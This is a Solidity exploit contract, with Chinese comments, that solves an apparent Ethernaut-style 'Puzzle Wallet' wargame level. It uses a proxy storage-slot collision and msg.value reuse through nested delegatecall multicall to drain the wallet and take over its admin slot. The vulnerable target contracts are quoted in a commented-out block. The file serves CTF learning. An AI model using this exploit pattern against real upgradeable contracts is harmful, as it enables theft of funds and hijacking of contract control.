// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Iwallet {
    function admin() external view returns (address);
    function proposeNewAdmin(address _newAdmin) external;
    function addToWhitelist(address addr) external;
    function deposit() external payable;
    function multicall(bytes[] calldata data) external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable;
    function setMaxBalance(uint256 _maxBalance) external;    
}
contract Hack{
    constructor(Iwallet wallet) payable {
        wallet.proposeNewAdmin(address(this));
        wallet.addToWhitelist(address(this));
        //为了成功的调用setMaxBalance函数使得最后的管理者地址为调用者，所以必须要把里面的钱全卷跑
        //所以我看到了execute函数
        //但是注意，这个函数要求必须要先存入多少取多少
        //如果使用重入又不能使用之前闪电贷那道题一样得到flag，所以需要使用最后一个函数
        //注意最后一个函数当中它会委托调用它自己这个合约所有的函数，但是任然不能做到存款的时候增加大于存入的钱。
        bytes[] memory deposit_data =new bytes[](1);
        deposit_data[0]=abi.encodeWithSelector(wallet.deposit.selector);
        bytes[] memory data=new bytes[](2);
        data[0]=deposit_data[0];
        data[1]=abi.encodeWithSelector(wallet.multicall.selector,deposit_data);
        wallet.multicall{value:0.001 ether}(data);
        //最后再提出来
        wallet.execute(msg.sender,0.002 ether,"");
        
        wallet.setMaxBalance(uint256(uint160(msg.sender)));
        require(wallet.admin()==msg.sender,"hack failed");
        selfdestruct(payable (msg.sender));

    }
}
/*import "../helpers/UpgradeableProxy-08.sol";
/*思路：(写在前面，应该是代理合约和逻辑合约的关系，而不是继承）
本题的要求是的到代理合约的admin，实际上这个合约就是代理合约另一个应该叫实现合约，但是这里叫反了
1.注意到时继承的关系，所以想利用代理合约的特性的时候槽位会进行覆盖，在solidity当中如果使用继承的时候相互之间都会修改
2.注意到实现合约与父合约的状态变量对应槽位
3.所以解决父合约的所有权，得到白名单，在返回到代理合约当中进行修改
*/
/*实现
1.修改代理合约当中pendingAdmin变量，使得代理合约的owner的变为自己
2.把自己变为白名单
3.调用setMaxBalance合约把状态变量2的槽位上修改为自己的地址，这样自己就成为代理合约的管理员*/
/*contract Hack {

    
}
contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    //这边也是一个可以被攻击的地方，因为在下面的父合约内部对应的槽位是owner
    address public admin;

    constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) {
        admin = _admin;
    }

    modifier onlyAdmin {
      require(msg.sender == admin, "Caller is not the admin");
      _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;//在这个地方可以修改pendingAdmin（也就是父合约的owner）
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
        admin = pendingAdmin;
    }
        //可以看到在这个合约当中只存在一个函数也就是这个函数改变了管理员。但是它要求了只有管理员才能调用
        //所以只能从合约的继承这个点来进行攻击
        //注意两个合约的关系，下面那个合约实际上是父类合约，因为最终的实现在本合约内
        //根据继承的特性，只要改变下面合约的maxBalance的值改为调用者就能获得控制权
    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}

contract PuzzleWallet {
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
      require(address(this).balance == 0, "Contract balance is not 0");
      maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
      require(address(this).balance <= maxBalance, "Max balance reached");
      balances[msg.sender] += msg.value;
    }

    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] -= value;
        (bool success, ) = to.call{ value: value }(data);
        require(success, "Execution failed");
    }

   // 多合约调用函数，接收一个包含多个合约调用数据的 calldata，并转发以太币（msg.value）给每个调用
    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false; // 用于标记是否已经调用了 deposit 函数

    // 遍历传入的调用数据数组
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                // 从调用数据中加载函数选择器（selector）
                selector := mload(add(_data, 32))
            }

        // 检查是否调用了 deposit 函数，确保只能调用一次
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
            // 防止重用 msg.value
                depositCalled = true;
            }

        // 使用 delegatecall 调用合约，并获取调用结果
            (bool success, ) = address(this).delegatecall(data[i]);
        // 如果调用失败，抛出错误信息
            require(success, "Error while delegating call");
    }
}

}
*/